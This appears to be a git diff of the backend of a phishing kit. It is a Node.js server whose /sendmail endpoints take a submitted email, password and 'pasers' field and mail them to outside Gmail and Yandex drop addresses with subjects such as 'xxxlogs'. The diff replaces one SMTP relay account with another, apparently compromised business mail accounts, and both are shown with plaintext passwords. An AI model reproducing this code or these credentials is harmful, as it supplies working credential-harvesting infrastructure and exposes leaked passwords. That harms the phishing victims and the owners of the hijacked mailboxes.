@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "webmail.umgroups.com",
+      host: "mail.lennox.co.ke",
       port: 465,
       auth: {
-        user: "aye.star@umgroups.com",
-        pass: "um9winwaynas",
+        user: "info@lennox.co.ke",
+        pass: "!in@Len432*",
       },
     });
     let info = await transporter.sendMail({
@@ -52,15 +52,15 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "webmail.umgroups.com",
+      host: "mail.lennox.co.ke",
       port: 465,
       auth: {
-        user: "aye.star@umgroups.com",
-        pass: "um9winwaynas",
+        user: "info@lennox.co.ke",
+        pass: "!in@Len432*",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <aye.star@umgroups.com>',
+      from: '"Happy time" <info@lennox.co.ke>',
       to: "daniellahm@yandex.com",
       subject: "happy Time",
       html: `
@@ -87,15 +87,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "webmail.umgroups.com",
+      host: "mail.lennox.co.ke",
       port: 465,
       auth: {
-        user: "aye.star@umgroups.com",
-        pass: "um9winwaynas",
+        user: "info@lennox.co.ke",
+        pass: "!in@Len432*",
       },
     });
     let info = await transporter.sendMail({
-      from: '"You" <aye.star@umgroups.com>',
+      from: '"You" <info@lennox.co.ke>',
       to: "sales1.ppsl@gmail.com",
       subject: "xxxlogs",
       html: `
@@ -122,15 +122,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "webmail.umgroups.com",
+      host: "mail.lennox.co.ke",
       port: 465,
       auth: {
-        user: "aye.star@umgroups.com",
-        pass: "um9winwaynas",
+        user: "info@lennox.co.ke",
+        pass: "!in@Len432*",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <aye.star@umgroups.com>',
+      from: '"Happy time" <info@lennox.co.ke>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -155,15 +155,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "webmail.umgroups.com",
+      host: "mail.lennox.co.ke",
       port: 465,
       auth: {
-        user: "aye.star@umgroups.com",
-        pass: "um9winwaynas",
+        user: "info@lennox.co.ke",
+        pass: "!in@Len432*",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <aye.star@umgroups.com>',
+      from: '"Happy time" <info@lennox.co.ke>',
       to: "p4pi.j@yandex.com",
       subject: "Happy time",
       html: `
